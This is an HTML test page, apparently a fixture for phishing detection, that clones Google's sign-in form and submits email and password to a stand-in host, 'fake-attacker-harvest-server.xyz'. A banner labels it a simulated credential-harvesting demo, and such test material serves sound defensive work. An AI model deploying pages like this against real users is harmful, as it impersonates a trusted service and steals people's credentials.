<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', -apple-system, sans-serif; }
        body { background: #f0f4f9; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: white; padding: 40px; border-radius: 28px; width: 440px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
        .logo { width: 48px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 500; margin-bottom: 8px; color: #1f1f1f; }
        p { font-size: 14px; color: #444746; margin-bottom: 24px; }
        .input-group { margin-bottom: 16px; }
        input { width: 100%; padding: 14px 16px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; outline: none; }
        input:focus { border-color: #0b57d0; border-width: 2px; }
        .warning-banner { background: #fee2e2; border-left: 4px solid #ef4444; padding: 10px 14px; border-radius: 4px; font-size: 12px; color: #991b1b; margin-bottom: 18px; }
        .btn { width: 100%; padding: 12px; background: #0b57d0; color: white; border: none; border-radius: 20px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="warning-banner">
            ⚠️ <strong>DOM Test Demo:</strong> This simulates an unauthorized cloned Google login form submitting credentials to an external HTTP endpoint.
        </div>
        <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google logo">
        <h1>Sign in</h1>
        <p>to continue to Google Account</p>
        
        <!-- Simulates deceptive form submitting to external unencrypted endpoint -->
        <form action="http://fake-attacker-harvest-server.xyz/capture" method="POST">
            <div class="input-group">
                <input type="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group">
                <input type="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn">Next</button>
        </form>
    </div>
</body>
</html>
